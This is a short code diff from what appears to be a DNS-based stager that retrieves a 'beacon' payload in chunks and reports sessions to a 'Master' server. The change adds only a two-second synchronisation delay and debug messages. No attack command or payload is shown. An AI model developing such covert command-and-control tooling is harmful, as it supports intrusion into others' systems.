@@ -1264,6 +1264,13 @@ int main(int argc, char *argv[]) {
     
     DEBUG_PRINT("[*] Beacon divided into %d chunks for retrieval\n", total_chunks);
     
+    // Wait 2 seconds to give DNS server time to report session to Master
+    // This ensures Master has created the session before chunk requests start
+    // Critical for progress tracking to work on first run
+    DEBUG_PRINT("[*] Waiting 2 seconds for session synchronization...\n");
+    sleep_ms(2000);
+    DEBUG_PRINT("[*] Starting chunk retrieval\n");
+    
     // Allocate chunk storage
     chunks = calloc(total_chunks, sizeof(unsigned char *));
     chunk_sizes = calloc(total_chunks, sizeof(size_t));
